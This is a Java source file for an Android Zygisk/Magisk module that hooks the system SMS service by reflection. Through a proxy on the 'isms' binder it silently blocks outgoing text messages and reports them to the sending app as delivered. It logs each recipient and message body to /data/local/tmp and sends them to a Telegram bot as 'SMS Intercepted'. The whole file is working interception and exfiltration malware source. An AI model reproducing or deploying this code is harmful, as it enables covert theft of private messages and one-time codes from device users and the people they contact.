package com.hivirtus.zygisk;

import android.app.Application;
import android.app.PendingIntent;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Exact SMS Tweaks / Drive Magisk module logic (MenuLoader path):
 * 1) Wait ActivityThread
 * 2) Hook ServiceManager.sCache["isms"] FIRST (before Application)
 * 3) Clear SmsManager caches
 * 4) On sendText / sendMultipart: TG + PendingIntent -1 + return null (no radio)
 */
public final class SmsTweaksHooks {
    private static final String TAG = "HivirtusSmsTweaks";
    private static final AtomicBoolean sStarted = new AtomicBoolean(false);
    private static final AtomicBoolean sHooked = new AtomicBoolean(false);
    private static volatile boolean sHookOutgoing = true;
    private static volatile String sProcess = "";

    private SmsTweaksHooks() {}

    /** Drive MenuLoader.init(process) — start ASAP from native. */
    public static void init(String process) {
        if (!sStarted.compareAndSet(false, true)) return;
        sProcess = process != null ? process : "";
        status("init_start|" + sProcess);
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    waitActivityThread();
                    applySmsHooks();
                    waitApplication();
                    status("init_ready|" + sProcess);
                } catch (Throwable t) {
                    status("init_fail|" + t.getClass().getSimpleName() + "|" + safe(t.getMessage()));
                    Log.e(TAG, "init fail", t);
                }
            }
        }, "hivirtus-sms-tweaks").start();
    }

    public static void install(Context ctx) {
        init(ctx != null ? ctx.getPackageName() : sProcess);
    }

    public static void setHookOutgoing(boolean on) {
        sHookOutgoing = on;
        status("hook_outgoing|" + on);
    }

    private static Object currentActivityThread() {
        try {
            Class<?> at = Class.forName("android.app.ActivityThread");
            Method m = at.getDeclaredMethod("currentActivityThread");
            m.setAccessible(true);
            return m.invoke(null);
        } catch (Throwable t) {
            return null;
        }
    }

    private static Application currentApplication() {
        try {
            Class<?> at = Class.forName("android.app.ActivityThread");
            Method m = at.getDeclaredMethod("currentApplication");
            m.setAccessible(true);
            Object app = m.invoke(null);
            return app instanceof Application ? (Application) app : null;
        } catch (Throwable t) {
            return null;
        }
    }

    private static void waitActivityThread() {
        for (int i = 0; i < 200; i++) {
            if (currentActivityThread() != null) return;
            try { Thread.sleep(25); } catch (InterruptedException ignored) {}
        }
    }

    private static void waitApplication() {
        for (int i = 0; i < 200; i++) {
            if (currentApplication() != null) return;
            try { Thread.sleep(25); } catch (InterruptedException ignored) {}
        }
    }

    private static void applySmsHooks() {
        if (sHooked.get()) return;
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Field cacheF = sm.getDeclaredField("sCache");
            cacheF.setAccessible(true);
            @SuppressWarnings("unchecked")
            Map<String, Object> cache = (Map<String, Object>) cacheF.get(null);
            if (cache == null) {
                status("isms_cache_null");
                return;
            }
            synchronized (cache) {
                Object existing = cache.get("isms");
                if (existing != null && Proxy.isProxyClass(existing.getClass())) {
                    sHooked.set(true);
                    status("isms_already_proxied");
                    return;
                }
                Object binder = existing;
                if (binder == null) {
                    Method getService = sm.getDeclaredMethod("getService", String.class);
                    getService.setAccessible(true);
                    binder = getService.invoke(null, "isms");
                }
                if (binder == null) {
                    status("isms_binder_null");
                    return;
                }
                final Object real = binder;
                Object proxy = Proxy.newProxyInstance(
                        binder.getClass().getClassLoader(),
                        binder.getClass().getInterfaces(),
                        new InvocationHandler() {
                            @Override
                            public Object invoke(Object p, Method method, Object[] args) throws Throwable {
                                String name = method.getName();
                                if (("sendText".equals(name) || "sendTextForSubscriber".equals(name)
                                        || "sendMultipartText".equals(name)
                                        || "sendMultipartTextForSubscriber".equals(name))
                                        && sHookOutgoing) {
                                    extractAndHandle(args);
                                    return null;
                                }
                                return method.invoke(real, args);
                            }
                        });
                cache.put("isms", proxy);
            }
            clearSmsManagerCaches();
            sHooked.set(true);
            status("isms_java_proxy_ok|" + sProcess);
            Log.i(TAG, "ServiceManager isms proxy installed in " + sProcess);
        } catch (Throwable t) {
            status("isms_java_proxy_fail|" + t.getClass().getSimpleName() + "|" + safe(t.getMessage()));
            Log.e(TAG, "applySmsHooks fail", t);
        }
    }

    private static void clearSmsManagerCaches() {
        try {
            Class<?> sms = Class.forName("android.telephony.SmsManager");
            for (String fn : new String[]{"sInstance", "sSubInstances", "sSubInstancesLock"}) {
                try {
                    Field f = sms.getDeclaredField(fn);
                    f.setAccessible(true);
                    Object v = f.get(null);
                    if (v instanceof Map) ((Map<?, ?>) v).clear();
                    else if (v != null && !(v instanceof Boolean) && !fn.contains("Lock")) f.set(null, null);
                } catch (Throwable ignored) {}
            }
            try {
                Method getDefault = sms.getDeclaredMethod("getDefault");
                getDefault.setAccessible(true);
                Object mgr = getDefault.invoke(null);
                if (mgr != null) {
                    for (String fn : new String[]{"mService", "iSms", "mISms"}) {
                        try {
                            Field f = mgr.getClass().getDeclaredField(fn);
                            f.setAccessible(true);
                            f.set(mgr, null);
                        } catch (Throwable ignored) {}
                    }
                }
            } catch (Throwable ignored) {}
            status("smsmanager_cache_cleared");
        } catch (Throwable t) {
            status("smsmanager_cache_fail|" + t.getClass().getSimpleName());
        }
    }

    private static void extractAndHandle(Object[] args) {
        if (args == null || args.length == 0) return;
        String to = "";
        String body = "";
        List<PendingIntent> intents = new ArrayList<>();
        for (Object a : args) {
            if (a == null) continue;
            if (a instanceof String) {
                String s = (String) a;
                if (s.isEmpty()) continue;
                if (looksLikePhone(s) && to.isEmpty()) to = s;
                else if (s.length() >= 8 && body.isEmpty() && !looksLikePackage(s)) body = s;
            } else if (a instanceof CharSequence) {
                String s = a.toString();
                if (s.length() >= 8 && body.isEmpty() && !looksLikePackage(s)) body = s;
            } else if (a instanceof List) {
                List<?> list = (List<?>) a;
                if (!list.isEmpty() && list.get(0) instanceof CharSequence && body.isEmpty()) {
                    StringBuilder sb = new StringBuilder();
                    for (Object o : list) {
                        if (o != null) sb.append(o);
                    }
                    body = sb.toString();
                } else if (!list.isEmpty() && list.get(0) instanceof PendingIntent) {
                    for (Object o : list) {
                        if (o instanceof PendingIntent) intents.add((PendingIntent) o);
                    }
                }
            } else if (a instanceof PendingIntent) {
                intents.add((PendingIntent) a);
            } else if (a instanceof PendingIntent[]) {
                for (PendingIntent pi : (PendingIntent[]) a) {
                    if (pi != null) intents.add(pi);
                }
            }
        }
        if (to.isEmpty() && body.isEmpty()) return;
        status("isms_java_send|" + to + "|" + (body.length() > 40 ? body.substring(0, 40) : body));
        writeBlockedJson(to, body);
        firePendingIntents(intents);
        sendTelegram(to, body);
    }

    private static boolean looksLikePhone(String s) {
        String d = s.replaceAll("[^0-9+]", "");
        if (d.startsWith("+")) d = d.substring(1);
        return d.length() >= 8 && d.length() <= 15 && d.matches("\\d+");
    }

    private static boolean looksLikePackage(String s) {
        return s.contains(".") && s.matches("[a-zA-Z][a-zA-Z0-9_]*(\\.[a-zA-Z][a-zA-Z0-9_]*)+");
    }

    private static void firePendingIntents(List<PendingIntent> intents) {
        if (intents == null || intents.isEmpty()) return;
        final List<PendingIntent> copy = new ArrayList<>(intents);
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                for (PendingIntent pi : copy) {
                    try { pi.send(-1); } catch (Throwable ignored) {}
                }
            }
        }, 300);
    }

    private static void writeBlockedJson(String to, String body) {
        try {
            File dir = new File("/data/local/tmp");
            if (!dir.exists()) dir.mkdirs();
            String json = "{\"to\":\"" + esc(to) + "\",\"body\":\"" + esc(body)
                    + "\",\"pkg\":\"" + esc(sProcess) + "\",\"ts\":" + System.currentTimeMillis() + "}\n";
            for (String name : new String[]{
                    "hivirtus_blocked_outgoing.json",
                    "hivirtus_last_outgoing.json"
            }) {
                FileOutputStream fos = new FileOutputStream(new File(dir, name), false);
                fos.write(json.getBytes(StandardCharsets.UTF_8));
                fos.close();
            }
            try {
                FileOutputStream fos = new FileOutputStream(
                        new File(dir, "hivirtus_isms_trace.txt"), true);
                fos.write(("java_send|" + System.currentTimeMillis() + "|" + to + "|"
                        + (body.length() > 60 ? body.substring(0, 60) : body) + "\n")
                        .getBytes(StandardCharsets.UTF_8));
                fos.close();
            } catch (Throwable ignored) {}
        } catch (Throwable ignored) {}
    }

    private static void sendTelegram(String to, String body) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String token = readFile("/data/local/tmp/hivirtus_tg_token.txt").trim();
                    String chat = readFile("/data/local/tmp/hivirtus_tg_chat.txt").trim();
                    if (token.isEmpty() || chat.isEmpty()) {
                        File cfg = new File("/data/adb/modules/hivirtus_zygisk_mode/config/telegram.env");
                        if (cfg.exists()) {
                            String[] lines = readFile(cfg.getAbsolutePath()).split("\n");
                            for (String line : lines) {
                                line = line.trim();
                                if (line.startsWith("BOT_TOKEN=")) token = line.substring(10).trim();
                                if (line.startsWith("CHAT_ID=")) chat = line.substring(8).trim();
                            }
                        }
                    }
                    if (token.isEmpty() || chat.isEmpty()) return;
                    String msg = "📱 <b>SMS Intercepted</b>\n\n"
                            + "<b>To:</b> " + escHtml(to) + "\n"
                            + "<b>Message:</b>\n" + escHtml(body);
                    String url = "https://api.telegram.org/bot" + token + "/sendMessage";
                    String payload = "chat_id=" + URLEncoder.encode(chat, "UTF-8")
                            + "&text=" + URLEncoder.encode(msg, "UTF-8")
                            + "&parse_mode=HTML";
                    HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                    c.setConnectTimeout(8000);
                    c.setReadTimeout(8000);
                    c.setDoOutput(true);
                    c.setRequestMethod("POST");
                    c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                    c.getOutputStream().write(payload.getBytes(StandardCharsets.UTF_8));
                    c.getResponseCode();
                    c.disconnect();
                    status("tg_sent|" + to);
                } catch (Throwable t) {
                    status("tg_fail|" + t.getClass().getSimpleName());
                }
            }
        }, "hivirtus-tg").start();
    }

    private static String readFile(String path) {
        try {
            java.io.FileInputStream fis = new java.io.FileInputStream(path);
            byte[] buf = new byte[4096];
            int n = fis.read(buf);
            fis.close();
            return n > 0 ? new String(buf, 0, n, StandardCharsets.UTF_8) : "";
        } catch (Throwable t) {
            return "";
        }
    }

    private static void status(String line) {
        try {
            File f = new File("/data/local/tmp/hivirtus_sms_tweaks_status.txt");
            FileWriter fw = new FileWriter(f, true);
            fw.write(System.currentTimeMillis() + "|" + line + "\n");
            fw.close();
        } catch (Throwable ignored) {}
        try {
            FileOutputStream fos = new FileOutputStream(
                    new File("/data/local/tmp/hivirtus_isms_trace.txt"), true);
            fos.write(("java|" + System.currentTimeMillis() + "|" + line + "\n")
                    .getBytes(StandardCharsets.UTF_8));
            fos.close();
        } catch (Throwable ignored) {}
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "");
    }

    private static String escHtml(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }

    private static String safe(String s) {
        return s == null ? "" : s.replace("\n", " ").replace("|", "/");
    }
}
